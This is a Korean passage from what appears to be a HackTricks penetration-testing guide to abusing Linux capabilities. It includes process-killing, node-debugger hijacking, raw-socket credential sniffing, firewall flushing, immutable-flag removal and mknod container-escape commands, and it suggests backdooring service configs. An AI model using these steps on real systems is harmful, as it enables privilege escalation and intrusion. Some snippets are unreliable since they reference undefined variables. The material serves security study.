setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

파일의 permitted capabilities는 프로세스의 capability bounding set에 의해 제한되며, 파일의 effective 비트는 파일의 permitted set이 프로세스의 effective set에 포함될지 여부를 제어합니다. 따라서 파일에 capabilities를 추가해도 요청한 모든 capability를 실행 시 자동으로 사용할 수 있는 것은 아닙니다.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `/dev/mem`, `/dev/kmem` 또는 `/proc/kcore`에 대한 접근, `mmap_min_addr` 수정, `ioperm(2)` 및 `iopl(2)` 시스템 호출 접근, 다양한 디스크 명령 등 여러 민감한 작업을 제공합니다. `FIBMAP ioctl(2)`도 이 capability를 통해 활성화되며, 이로 인해 [과거](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)에 문제가 발생한 적이 있습니다. man page에 따르면, 이 capability를 가진 사용자는 다른 장치에서 장치별 작업도 다양하게 수행할 수 있습니다.<sup>[[14]](#references)</sup>

이는 **privilege escalation** 및 **Docker breakout**에 유용할 수 있습니다.<sup>[[14]](#references)</sup>

이 capability만으로는 유용한 인터페이스가 노출되지 않습니다. 컨테이너 breakout을 위해서는 접근 가능한 호스트 장치 또는 리소스, device-cgroup 및 파일 시스템 권한, 그리고 하드웨어 및 커널별 기법이 추가로 필요합니다. 엄격한 `/dev/mem` 제한, kernel lockdown, 가상화, seccomp, LSM 정책은 일반적으로 범용 경로를 차단합니다. 먼저 capability와 노출 여부를 확인하세요:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

승인된 인터페이스가 `/dev/mem`인 경우, 폐기 가능한 실험 환경에서 해당 환경의 하드웨어 맵에서 선택한 범위를 읽고 해시해 경계를 넘는 노드 메모리 노출을 시연할 수 있습니다:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Do not guess the range: 일부 MMIO 영역을 읽으면 부작용이 발생할 수 있으며, 한 플랫폼에서 유효한 주소가 다른 플랫폼에서는 하드웨어나 kernel memory를 제어할 수 있습니다. Kernel memory 수정이나 장치 제어에는 승인된 플랫폼별 proof가 필요합니다. 안전하고 보편적으로 사용할 수 있는 raw-write 예제는 없습니다.

## CAP_KILL

**이 capability는 kernel이 정의한 경우에 프로세스에 signal을 보내는 권한 검사를 우회합니다**.<sup>[[14]](#references)</sup>

**binary 예시**

**`python`** binary에 이 capability가 있다고 가정해 보겠습니다. **일부 service 또는 socket 설정**(또는 service 관련 설정 파일)을 수정할 수도 있다면, 해당 파일에 backdoor를 삽입한 다음 service와 관련된 프로세스를 종료하고, 새로운 설정 파일이 backdoor와 함께 실행될 때까지 기다릴 수 있습니다.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

kill 권한이 있고 **root로 실행 중인 node 프로그램**(또는 다른 사용자로 실행 중인 프로그램)이 있다면, 해당 프로그램에 **SIGUSR1 시그널을 보내** **node debugger를 열게 한 다음** 연결할 수 있을 것입니다.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**이 capability는 1024 미만의 Internet 포트에 바인딩할 수 있도록 허용합니다.** 이 capability만으로 더 광범위한 권한 상승이 직접 허용되지는 않습니다.<sup>[[14]](#references)</sup>

**바이너리 예시**

**`python`**에 이 capability가 있으면 모든 포트에서 대기할 수 있고, 해당 포트에서 다른 포트로 연결할 수도 있습니다(일부 서비스는 특정 권한 포트에서의 연결을 요구합니다).

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 프로세스가 **RAW 및 PACKET 소켓을 생성**하도록 허용하여 임의의 네트워크 패킷을 생성하고 전송할 수 있게 합니다. 이는 컨테이너 환경에서 패킷 스푸핑, 트래픽 삽입, 네트워크 액세스 제어 우회와 같은 보안 위험을 초래할 수 있습니다. 악의적인 행위자는 이를 악용해 컨테이너 라우팅을 방해하거나 호스트 네트워크 보안을 침해할 수 있으며, 특히 방화벽 보호가 충분하지 않은 경우 위험이 큽니다. 또한 **CAP_NET_RAW**는 RAW ICMP 요청을 이용한 ping과 같은 작업도 지원합니다.<sup>[[14]](#references)</sup>

**적절한 소켓 인터페이스가 있으면 패킷 캡처가 가능합니다.** 이 권한만으로 더 광범위한 권한 상승이 직접 허용되지는 않습니다.<sup>[[14]](#references)</sup>

자격 증명 노출 경로를 확인하려면 현재 계정이 유효 권한으로 캡처 도구를 실행할 수 있는지, 관련 트래픽이 해당 네트워크 네임스페이스에서 볼 수 있는 인터페이스를 통과하는지, 인증 정보가 평문으로 전송되는지를 함께 확인해야 합니다. 예를 들어 캡처 도구가 루프백 인터페이스에 접근할 수 있다면 암호화되지 않은 HTTP의 HTTP Basic 자격 증명을 관찰할 수 있습니다. 계정 전환이 가능하려면 캡처한 자격 증명이 다른 ID에도 유효해야 합니다. 파일 capability가 있거나 로그인 요청이 보인다는 사실만으로는 비밀번호 재사용이 입증되지 않습니다.

무선 호스트에서는 `iw dev`를 통해 보이는 AP와 monitor mode 인터페이스가 있고 실행 파일인 WPS 감사 도구 `reaver`에 유효한 `CAP_NET_RAW`가 설정되어 있다면 추가 검토가 필요합니다. 이는 **실제로 가능한 권한 상승의 증거가 아닙니다**. AP에서 효과적인 잠금 없이 WPS PIN 인증을 허용해야 하고, 무선 인터페이스에서 접근 가능해야 하며, PSK를 노출해야 합니다. 호스트 권한은 해당 PSK가 계정에도 재사용될 때만 변경됩니다. 수동 열거에서는 probe를 전송하거나 PIN을 시도하지 말고 인터페이스 모드와 capability를 보고해야 합니다. WPS PIN 취약점은 [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755)를, 도구의 동작은 [Reaver의 프로젝트 문서](https://github.com/shift/reaver-wps)를 참조하세요.

**바이너리 예시**

바이너리 **`tcpdump`**에 이 capability가 있으면 네트워크 정보를 캡처할 수 있습니다.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

환경에서 이 capability를 부여하면 **`tcpdump`**도 이를 사용해 트래픽을 스니핑할 수 있습니다.<sup>[[14]](#references)</sup>

**바이너리 2를 사용한 예시**

다음은 "**lo**" (**localhost**) 인터페이스의 트래픽을 가로채는 데 유용한 **`python2`** 코드입니다. 이 코드는 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)의 "_기초: CAP-NET_BIND + NET_RAW_" 랩에서 가져왔습니다.<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 보유자에게 현재 network namespace의 방화벽 설정, 라우팅 테이블, socket 권한, network interface 설정을 포함한 **네트워크 구성을 변경할 권한**을 부여합니다. 또한 해당 namespace의 interface에서 promiscuous mode를 활성화할 수 있습니다. 이로 인해 해당 interface로 전달되는 트래픽이 노출될 수 있지만, 이것만으로 다른 network namespace에 있는 임의의 interface를 sniffing할 수 있는 것은 아닙니다.<sup>[[14]](#references)</sup>

이러한 작업은 프로세스의 **현재 network namespace**에 영향을 줍니다. 호스트 네트워크 상태를 제어하려면 `--network=host`, Kubernetes의 `hostNetwork: true` 또는 별도의 namespace 진입 수단이 필요합니다. `CAP_NET_RAW`만으로 일반적인 호스트 shell을 얻을 수는 없지만, 문서화된 프로토콜별 escape에 사용된 사례가 있습니다. 과거 GCE 공격 체인에서는 root 권한, 호스트 network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, 암호화되지 않은 metadata 트래픽, 그리고 SSH key를 주입하기 위해 경쟁 상태를 악용할 수 있는 guest-agent 요청이 결합되었습니다. 전체 전제 조건과 최신 HTTPS metadata 관련 주의 사항은 [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html)를 참고하세요.

**binary 예시**

**python binary**에 다음 capabilities가 있다고 가정해 보겠습니다.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**이 capability를 사용하면 immutable 및 append-only와 같은 inode 플래그를 수정할 수 있습니다.** 이 capability만으로 더 광범위한 권한 상승이 가능해지는 것은 아닙니다.<sup>[[14]](#references)</sup>

**binary 예시**

파일이 immutable이고 python에 이 capability가 있다면, **immutable 속성을 제거해 파일을 수정할 수 있게 만들 수 있습니다:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

`FS_IOC_GETFLAGS` 및 `FS_IOC_SETFLAGS` 작업은 inode 플래그를 읽고 업데이트합니다. `FS_IMMUTABLE_FL`은 이 예제에서 해제하는 immutable 플래그입니다.<sup>[[27]](#references)</sup>

> [!TIP]
> 일반적으로 이 immutable 속성은 다음을 사용해 설정하고 제거합니다.
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `chroot(2)` 시스템 호출을 실행할 수 있게 하며, 알려진 기법을 통해 허술하게 구성된 `chroot(2)` jail에서 탈출할 수 있습니다.<sup>[[11]](#references)[[14]](#references)</sup>

이는 **chroot-jail 탈출 capability이며, 단독으로 컨테이너에서 호스트로 탈출할 수 있는 capability는 아닙니다**. 호스트 파일시스템을 노출하거나 해당 파일시스템의 권한을 우회하지 않습니다. 호스트 루트가 이미 마운트되어 있거나 `/proc/<pid>/root`를 통해 접근 가능한 경우, `chroot()`는 기존 트리를 프로세스의 경로 루트로 설정할 뿐입니다. 이와 별개로 `setns(2)`를 사용해 mount namespace를 변경하려면 호출자의 user namespace에서 `CAP_SYS_CHROOT`와 `CAP_SYS_ADMIN`이 모두 필요하며, 대상 mount namespace를 소유한 user namespace에서도 `CAP_SYS_ADMIN`이 필요합니다.<sup>[[14]](#references)</sup>

- [여러 chroot 솔루션에서 탈출하는 방법](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot 탈출 도구](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 시스템 재시작을 위한 `reboot(2)` 시스템 호출을 실행할 수 있게 합니다. 여기에는 `LINUX_REBOOT_CMD_RESTART2`와 같은 명령이 포함됩니다. 또한 새 crash kernel을 로드하기 위한 `kexec_load(2)`와, Linux 3.17부터는 서명된 crash kernel을 로드하기 위한 `kexec_file_load(2)`도 사용할 수 있습니다.<sup>[[14]](#references)</sup>

private PID namespace 안에서 지원되는 `reboot()` 요청을 실행하면 호스트가 재부팅되는 대신 해당 namespace의 init 프로세스가 종료됩니다. 따라서 호스트를 재부팅하려면 initial PID namespace가 필요하며, 일반적으로 이를 위해 호스트 PID 공유가 필요합니다. kexec를 통한 탈취에는 호환되는 이미지, 사용 가능한 syscall, 그리고 허용적인 lockdown 및 서명 정책도 필요합니다. capability를 확인하기 위해 공유 호스트에서 두 작업 중 어느 것도 실행하지 마세요:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 Linux 2.6.37에서 더 포괄적인 **CAP_SYS_ADMIN**으로부터 분리되어, `syslog(2)` 호출을 사용할 수 있는 권한을 부여합니다. 이 capability가 있으면 `kptr_restrict` 설정이 1일 때 `/proc` 및 유사한 인터페이스를 통해 커널 주소를 볼 수 있습니다. 이 설정은 커널 주소의 노출 여부를 제어합니다. Linux 2.6.39부터 `kptr_restrict`의 기본값은 0으로, 커널 주소가 노출됩니다. 다만 많은 배포판은 보안상의 이유로 이를 1(uid 0 외에는 주소 숨김) 또는 2(항상 주소 숨김)로 설정합니다.<sup>[[14]](#references)</sup>

또한 `dmesg_restrict`가 1로 설정된 경우 **CAP_SYSLOG**를 사용하면 `dmesg` 출력에 접근할 수 있습니다. 이러한 변경에도 불구하고, 역사적인 이유로 **CAP_SYS_ADMIN**은 계속 `syslog` 작업을 수행할 수 있습니다.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `mknod` 시스템 호출의 기능을 확장하여 일반 파일, FIFO(명명된 파이프), UNIX 도메인 소켓 외에도 특수 파일을 생성할 수 있게 합니다. 특수 파일에는 다음이 포함됩니다.<sup>[[14]](#references)</sup>

- **S_IFCHR**: 터미널과 같은 장치인 문자 특수 파일.
- **S_IFBLK**: 디스크와 같은 장치인 블록 특수 파일.

이 capability는 문자 장치나 블록 장치를 포함해 장치 파일을 생성해야 하는 프로세스에 유용합니다.<sup>[[14]](#references)</sup>

이 capability는 Docker에서 문서화한 기본 capability 집합에 포함되어 있습니다. 모든 배포가 동일한 기본값을 사용한다고 가정하지 말고 실제 런타임 구성을 확인하세요 ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

컨테이너 탈출 시나리오에서 `CAP_MKNOD`는 실제 호스트 장치를 가리키는 핸들이 없는 경우 이를 생성할 수 있지만, **기반 장치를 생성하지는 않으며** **device cgroup을 우회하지도 않습니다**. 전체 공격 경로에는 다음이 필요합니다.

1. 장치 생성은 namespace에 속하지 않으므로, 초기 user namespace에서 유효한 `CAP_MKNOD`.
2. 실제 호스트 장치에 해당하는 올바른 블록 또는 문자 유형과 major/minor 번호.
3. 해당 장치를 열 수 있는 device-cgroup 권한.
4. 호환되는 파일시스템 인식 reader, 또는 블록 파일시스템을 마운트할 `CAP_SYS_ADMIN`.
5. 노드를 생성하고 사용할 수 있는 파일시스템 및 LSM 권한.

실제 major/minor 번호가 `252:1`인 ext 계열 실습용 블록 장치의 경우, 읽기 전용 검증은 다음과 같습니다.

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

`/sys/class/block/<device>/dev`에 보고된 값으로 숫자를 바꾸세요. 노드 생성은 성공하지만 노드를 열 때 `Operation not permitted`가 반환되면, device cgroup이 여전히 접근을 차단하고 있는 것입니다. Docker의 기본 `CAP_MKNOD`만 있고 명시적으로 장치 접근이 허용되지 않은 컨테이너에서 나타나는 일반적인 결과입니다.

직접적인 컨테이너 장치 접근과 혼동해서는 안 되는 별개의 **two-foothold local privilege-escalation** 기법도 있습니다. 초기 user namespace를 공유하는 컨테이너의 root 프로세스는 block-device node를 생성할 수 있고, UID가 일치하는 호스트의 비특권 shell은 `/proc/<container-pid>/root`를 통해 해당 노드를 열 수 있습니다. 이때 open은 호스트 shell의 cgroup에서 평가되므로 컨테이너의 device-cgroup 차단은 더 이상 장치를 보호하지 못합니다.<sup>[[7]](#references)</sup>

컨테이너 안에서 노드를 생성하고, 기존 호스트 foothold의 UID로 실행되는 프로세스를 계속 실행 상태로 유지하세요:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

해당 UID의 기존 host shell에서 대기 상태인 컨테이너 프로세스의 host PID를 확인하고, 해당 프로세스의 procfs root를 장치 경로로 사용합니다:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

이 chain에는 두 foothold, identity-mapped 또는 shared user namespace, 대상 `/proc/<pid>/root`를 탐색할 권한, 올바른 major/minor number를 가진 실제 device, 그리고 open을 허용하는 outer cgroup이 모두 필요합니다. `hidepid`, ptrace-access 규칙, LSM, filesystem 비호환성 또는 user-namespace remapping으로 인해 동작하지 않을 수 있습니다. 이 historical technique이 중요한 이유는 `/proc/<pid>/root`가 *container의* device-cgroup 제한을 어떻게 우회할 수 있는지 설명하기 때문입니다. `CAP_MKNOD`만으로 일반적으로 격리된 container에서 탈출할 수 있다는 뜻은 아닙니다.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

file capabilities를 사용하는 현재 Linux kernel에서 **`CAP_SETPCAP`**은 thread가 자신의 bounding set에 있는 capabilities를 inheritable set에 추가하고, bounding set에서 capabilities를 제거하며, securebits를 변경하도록 허용합니다. process가 다른 process에 임의로 capabilities를 부여할 수 있는 것은 아닙니다. 이 동작은 file-capability 지원이 없는 2.6.25 이전 kernel에만 해당합니다.<sup>[[14]](#references)</sup>

`capset()` system call은 thread 자체의 effective, permitted, inheritable set을 조정할 수 있지만, 새 permitted set에는 기존 permitted set에 없는 capabilities를 포함할 수 없으며 inheritable 변경에는 여전히 kernel 제약이 적용됩니다.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities 권한 상승 실습](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux 권한 상승](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container 기초: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux Capabilities 활용하기](https://www.linuxjournal.com/article/5737)
- [6] [과도한 Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [/proc/pid/root를 통한 mount namespace 접근 악용](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: 존재 이유와 작동 방식](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Linux의 Capabilities 이해하기](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace가 허용된 경우 seccomp 우회 PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [다양한 chroot 솔루션에서 탈출하는 방법](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer의 원본 CAP_DAC_READ_SEARCH Docker 탈출 exploit](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker 탈출 exploit 분석](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu 매뉴얼 페이지](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [컨테이너 실행 - Docker 문서](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker 문서](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
